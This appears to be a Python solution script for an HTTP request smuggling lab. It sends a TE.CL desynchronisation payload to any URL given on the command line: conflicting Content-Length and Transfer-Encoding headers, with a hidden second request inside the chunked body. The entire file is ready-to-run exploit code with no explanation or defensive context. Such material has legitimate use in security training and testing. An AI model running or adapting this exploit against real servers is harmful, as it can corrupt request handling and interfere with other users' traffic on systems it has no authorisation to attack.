import socket
import ssl
import sys
import urllib.parse

def request_smuggling_attack(host, port, path):
    raw_request = (
        "POST {} HTTP/1.1\r\n"
        "Host: {}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "5e\r\n"
        "POST /404 HTTP/1.1\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 15\r\n"
        "\r\n"
        "x=1\r\n"
        "0\r\n"
        "\r\n"
    ).format(path, host)

    context = ssl.create_default_context()

    with socket.create_connection((host, port)) as sock:
        with context.wrap_socket(sock, server_hostname=host) as ssock:
            for _ in range(2):
                ssock.sendall(raw_request.encode())
                response = ssock.recv(4096)
                print(response.decode())

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 solution.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    parsed_url = urllib.parse.urlparse(url)

    host = parsed_url.hostname
    port = parsed_url.port if parsed_url.port else 443  # Default to HTTPS port
    path = parsed_url.path if parsed_url.path else "/"

    request_smuggling_attack(host, port, path)
    request_smuggling_attack(host, port, path)
